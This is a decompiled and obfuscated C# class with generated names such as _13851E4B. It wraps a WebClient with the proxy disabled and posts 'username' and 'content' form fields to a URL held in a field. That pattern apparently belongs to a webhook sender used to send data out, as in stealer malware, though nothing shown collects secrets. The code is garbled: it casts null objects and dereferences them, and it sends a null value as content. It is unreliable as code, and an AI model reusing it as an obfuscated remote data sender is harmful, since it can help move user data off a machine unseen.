using System;
using System.Collections.Specialized;
using System.Net;

public class _13851E4B : IDisposable
{
	private static readonly NameValueCollection Form_002D7559647;

	private readonly WebClient PropertyTabChangedEventHandler_002D6794756;

	public string Padding_002D7063240;

	public string StringSorter_002D4889576;

	public _13851E4B()
	{
		_ = (new object[1] { this })[0];
		object obj = null;
		((_13851E4B)obj).Padding_002D7063240 = string.Empty;
		((_13851E4B)obj).StringSorter_002D4889576 = string.Empty;
		obj._002Ector();
		((_13851E4B)obj).PropertyTabChangedEventHandler_002D6794756 = new WebClient
		{
			Proxy = null
		};
	}

	public void Dispose()
	{
		object[] array = new object[1] { this };
		_ = array[0];
		object obj = null;
		((_13851E4B)obj).PropertyTabChangedEventHandler_002D6794756.Dispose();
	}

	public void ToolStripDropDownClosingEventHandler_002D4393126(string FlowLayoutSettings_002D4937710)
	{
		object[] array = new object[2] { this, FlowLayoutSettings_002D4937710 };
		object obj = array[1];
		string value = null;
		_ = ((object[])obj)[0];
		object obj2 = null;
		Form_002D7559647.Add("username", ((_13851E4B)obj2).Padding_002D7063240);
		Form_002D7559647.Add("content", value);
		((_13851E4B)obj2).PropertyTabChangedEventHandler_002D6794756.UploadValues(((_13851E4B)obj2).StringSorter_002D4889576, Form_002D7559647);
		Form_002D7559647.Clear();
	}

	static _13851E4B()
	{
		_ = null;
		Form_002D7559647 = new NameValueCollection();
	}
}
